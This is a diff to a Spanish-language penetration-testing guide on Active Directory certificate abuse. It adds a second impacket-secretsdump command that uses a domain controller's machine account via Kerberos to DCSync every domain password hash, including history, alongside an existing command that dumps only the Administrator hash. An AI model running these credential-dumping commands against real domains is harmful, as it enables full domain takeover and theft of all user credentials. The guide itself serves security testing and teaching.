@@ -146,7 +146,11 @@ Si el certificado pertenece a un Domain Controller (por ejemplo mediante coerci�
 * Permite volcar directamente los hashes de todo el dominio mediante DCSync sin conocer la contraseña del administrador:
 
 ```bash
+# Ejemplo para extraer solamente el hash del user administrador
 impacket-secretsdump -k -no-pass -dc-ip 10.10.10.10 -just-dc-user Administrator 'CORP.LOCAL/DC01$'@DC01.CORP.LOCAL
+
+# Ejemplo para tratar de volcar todo lo posible
+impacket-secretsdump -k -no-pass -history -dc-ip 10.10.10.10 'CORP.LOCAL/DC01$'@DC01.CORP.LOCAL
 ```
 
 ### Caso 4: Cuenta de Máquina Estándar (`WORKSTATION$` o `SERVER$`)
